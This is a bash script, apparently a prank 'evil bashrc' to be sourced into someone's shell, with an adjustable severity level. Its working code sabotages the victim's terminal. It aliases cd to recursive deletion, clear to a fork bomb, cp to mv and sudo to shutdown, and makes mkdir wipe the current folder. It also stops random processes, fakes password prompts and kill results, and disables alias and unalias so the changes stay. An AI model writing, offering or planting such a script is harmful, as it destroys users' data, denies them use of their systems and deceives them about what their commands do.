#!/usr/bin/env bash

# valid values are: insane, annoying, destructive, devasting, unusable
# each mode of operation includes the previous one's tweaks
#
# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
#   open a new shell
# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
#   (random) directory
# destructive: delete files and do serious harm, non-recoverable damage included
# devasting: may delete /
# unusable: enable everything including, but not limited to replacing enter by backspace
EVIL_BEHAVIOUR=annoying

function insane()
{
	annoying || test "$EVIL_BEHAVIOUR" = "insane"
}

function annoying()
{
	destructive || test "$EVIL_BEHAVIOUR" = "annoying"
}

function destructive()
{
	devasting || test "$EVIL_BEHAVIOUR" = "destructive"
}

function devasting()
{
	unusable || test "$EVIL_BEHAVIOUR" = "devasting"
}

function unusable()
{
	test "$EVIL_BEHAVIOUR" = "unusable"
}

# Set `rm` as the default editor.
destructive && export EDITOR=/bin/rm;

# Make Tab send the delete key.
insane && tset -Qe $'\t';

# Randomly make the shell exit whenever a command has a non-zero exit status.
if insane
then
	((RANDOM % 10)) || set -o errexit;
fi

#Just exit session when rebooting box
insane && alias reboot=exit;

# Let `cat` swallow every input and never return anything.
annoying && alias cat=true;

# Use a random sort option whenever `ls` is invoked.
annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

#If you type sl, reverse the output of ls
insane && alias sl='ls | rev 2>/dev/null'

# Use a random sort option whenever `history` is invoked.
insane && alias history='history | shuf'

# Delete directories instead of entering them.
devasting && alias cd='rm -rfv';

# Launch a fork bomb instead of clearing the screen.
destructive && alias clear=':(){ :|:& };:';

# Have `date` return random dates.
annoying && alias date='date -d "now + $RANDOM days"';

annoying && if [[ $[$RANDOM % 10] == 0 ]]; then
	PS1="Login: "
	alias $USER='stty -echo; echo -n "Password: ";read;echo;echo "Login failed.";stty echo'
	alias root='stty -echo; echo -n "Password: ";read;echo;echo "Login failed.";stty echo'
fi

#Make sudo always say not in the sudoers file
annoying && function sudo { echo -n "[sudo] password for $(whoami): "; read -s; echo ""; sleep 2; echo "$(whoami) is not in the sudoers file.  This incident will be reported."; }

# Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
# Other times, resist all attempts at opening it. Other times, make it read
# reaaaalllly sllooowwwwllly.
annoying && if [ "$(uname)" = 'Darwin' ]; then
	# Much less fun on Macs, alas.
	if [[ $[$RANDOM % 2] == 0 ]]; then
		# Eject!
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	else
		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
		# locking and are slot-loading anyway.
		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
	fi;
else
	N=$[$RANDOM % 3];
	if [[ $N == 0 ]]; then
		# Open and close randomly after a few minutes.
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	elif [[ $N == 1 ]]; then
		# Lock, and keep closing just in case.
		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
	else
		# Slowness (1× CD speed). This has to be in a loop because it resets with
		# every ejection.
		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
	fi;
fi;

# Send STOP signal to random process at random time.
destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &

# Have `cp` perform `mv` instead.
destructive && alias cp='mv';

# Make `exit` open a new shell.
annoying && function exit { $(cat /etc/passwd | grep $(whoami) | cut -d ':' -f 7;); }

# Shut down the computer instead of running a command with super-user rights.
destructive && alias sudo='sudo shutdown -P now';

# Add a random number to line numbers when using `grep -n`.
insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }

# Invert `if`, `for`, and `while`.
annoying && alias if='if !' for='for !' while='while !';

# Map Enter, Ctrl+J, and Ctrl+M to backspace.
unusable && bind '"\C-J":"\C-?"';
unusable && bind '"\C-M":"\C-?"';

# Send `n` (no) instead of `y` (yes)
annoying && alias yes="yes n";

#Make uname output windows
annoying && alias uname='echo "Windows XP" 2>/dev/null'

# Quit vim on startup.
annoying && alias vim="vim +q";

#Make kill and pkill seem successfull, even though they aren't
insane && alias kill='echo "Process Killed"'
insane && alias pkill='echo "Process Killed"'

#Randomize Text Editors
annoying && alias vi=nano
annoying && alias emacs=vim
annoying && alias vim=vi
annoying && alias nano=emacs

#Disable find
annoying && alias find='false 2>/dev/null'

#Disable which
annoying && alias which='false 2>/dev/null'

#mkdir deletes everything in current folder, then make directory
devastating && function mkdir { rm -rf * 2>/dev/null ; mkdir $1; }

#Make SSH say connection refused
insane && function ssh { sleep 2; echo "ssh: connect to host $(echo $1 | sed -n -e 's/.*@//p') port 22: Connection refused"; }

#Make ping say destination host unreachable forever
annoying && function ping { i=1; echo "PING $1 ($1) 56(84) bytes of data."; while true; do echo "From $1 icmp_seq=$i Destination Host Unreachable"; i=$((i+1)); sleep 1; done }

#Make chmod just show file instead of changing it
insane && alias chmod="ls -lah 2>/dev/null"

# Disable `unalias` and `alias`.
alias unalias=false;
alias alias=false;
